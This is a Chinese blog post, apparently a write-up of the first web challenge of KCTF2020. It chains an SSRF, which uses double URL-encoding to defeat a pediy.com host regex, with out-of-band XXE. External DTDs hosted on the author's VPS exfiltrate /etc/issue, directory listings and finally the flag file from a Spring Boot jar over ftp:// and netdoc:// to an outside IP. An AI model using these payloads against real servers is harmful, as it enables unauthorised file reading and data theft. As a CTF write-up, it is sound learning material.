---
title: KCTF2020第一题WP
date: 2020-11-20 11:56:00
tags:
    - WEB
    - CTF
categories:
	- CTF
preview: https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/52pojie.jpg
description: 
---

## 第一题 至暗时刻

题目描述：

一道Web题，访问链接：

http://121.36.145.157:8088/

利用技术绕过限制，获得flag.txt文件中的值。

访问页面，是一张图片，查看页面源代码：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic1.png)

    <html>
    <head>
    <meta charset="UTF-8">
    <title>test</title>
    </head>
    <body>
    <img src="/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg">
    <!--测试加载配置文件 /loadConfig?url=x.xml-->
    </body>
    </html>

发现一个被注释掉的url:  

    http://121.36.145.157:8088/loadConfig?url=x.xml  

看样子貌似可以访问指定的url  
但访问页面返回`not allow ip`，IP不被允许：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic2.png)  

尝试 `X-Forwarded-For` 伪造客户端IP  
抓包到burp中，爆破了一些内网ip都显示`not allow ip`:  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic3.png)  

仅192.168端就有60000多个ip，显然也不会是爆破去做-_-|

回顾前面的网页源码发现另一个用来加载图片的链接：  

    http://121.36.145.157:8088/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg

是访问指定的url获取资源的，尝试修改url参数，返回如下的正则表达式：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic4.png)  

    illegal url! ^(http|https):\\/\\/[^?#\\/]*\\.pediy\\.com\\/.*

应该是要想办法绕过这个正则，访问指定的url  
这个正则要求url是如下格式：  

    http://{1}.pediy.com/{2}
    或
    https://{1}.pediy.com/{2}

{1}处不允许出现'？'，'#'，'/'字符  
{2}处可以是任意内容

直接用'#'无法通过正则：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic5.png) 

尝试进行URL编码，还是不能通过正则：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic6.png) 

换其它符号试试，发现在做正则检查前会进行一次URL解码：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic7.png)

尝试进行两次URL编码绕过：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic8.png)

绕过成功，已经尝试去访问 `https://127.0.0.1` 了  

在自己的vps起了web服务，用这个ssrf去访问，企图获得真实IP，然后用这个IP去利用第一个接口：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic9.png)

这里注意到，我的web是起在5000端口的，但直接输 `http://ip:port` 的形式会报错 `invalid port number`  

所以':'也要两次URL编码，访问成功，但是在我的vps获得的IP是 `121.36.145.157` :  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic10.png)

这不就是题目地这么，拿去 `/loadConfig?url=x.xml` 那里尝试，依然是 `not allow ip` ，行不通  

又尝试ssrf `http://127.0.0.1:8088/loadConfig?url=x.xml` 这个url，构造请求：  

    http://121.36.145.157:8088/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=x.xml

返回结果，访问成功： 

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic11.png)

发到burp中继续尝试：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic12.png)

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic13.png)

发现会从 `/loadConfig?url=x.xml` 指定的位置读取文件并当作XML来解析，猜测XXE漏洞  

在自己的vps上放了以下payload：  

    =================================================================================
    <!-- t.dtd -->
    <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY sp SYSTEM "file:///etc/issue">
    ]>
    <r>&sp;</r>
    =================================================================================

构造请求：  

    /getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://{my_vps_ip}:5000/t.dtd

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic14.png)

没有正常回显内容，尝试用FTP协议把内容发送出来，payload:  

    =================================================================================
    <!-- c.dtd -->
    <?xml version="1.0"?>
    <!DOCTYPE r [
    <!ENTITY % data3 SYSTEM "file:///etc/issue">
    <!ENTITY % sp SYSTEM "http://my_vps_ip:5000/d.dtd">
    %sp;
    %param3;
    %exfil;
    ]>
    =================================================================================
    <!-- d.dtd -->
    <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://my_vps_ip:30000/%data3;'>">
    =================================================================================

并在vps的30000端口上起了ftp服务，脚本：https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb  

构造请求：  

    /getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/c.dtd

在vps上接收到内容 `/etc/issue` 文件的内容：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic15.png)

但是尝试读含有特殊字符的文件时，就无法正常发送数据到vps:  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic16.png)

而且没法查看目录，没办法找flag  
之后又用netdoc协议试试，可以列目录，最终使用以下payload：  

    =================================================================================
    <!-- g.dtd -->
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE creds [
    <!ENTITY % data3 SYSTEM "netdoc:///">
    <!ENTITY % sp SYSTEM "http://my_vps_ip:5000/d.dtd">
    %sp;
    %param3;
    %exfil;n
    ]>
    =================================================================================
    <!-- d.dtd -->
    <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'netdoc://my_vps_ip:80/%data3;'>">
    =================================================================================

构造请求：  

    /getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/g.dtd

在burp中可以回显，已经可以列目录，读文件了：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic17.png)
![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic18.png)

之后就是列目录，看文件。。。

最后在/home下有一些jar包：  

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic19.png)  

用jar:file：读jar包，尝试了spring jar包常见的路径

最后找到flag.txt的路径是 `vip-demo-0.0.1-SNAPSHOT.jar`包下的 `/BOOT-INF/classes/flag.txt`，payload：  

    =================================================================================
    <!-- g.dtd -->
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE creds [
    <!ENTITY % data3 SYSTEM "jar:file:///home/vip-demo-0.0.1-SNAPSHOT.jar!/BOOT-INF/classes/flag.txt">
    <!ENTITY % sp SYSTEM "http://{my_vps_ip}:5000/d.dtd">
    %sp;
    %param3;
    %exfil;n
    ]>
    =================================================================================
    <!-- d.dtd -->
    <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'netdoc://101.37.76.66:80/%data3;'>">
    =================================================================================

获得flag截图：

![ ](https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic20.png)

获得的flag是 `flag{congratulations-Path-the-spring-boot}`

>作者：Boringboys  
>原文链接：https://www.boringboys.top/2020/11/20/KCTF2020第一题WP/  
>版权声明：本文采用[BY-NC-SA](https://creativecommons.org/licenses/by-nc-sa/4.0/)协议授权，转载请遵守此协议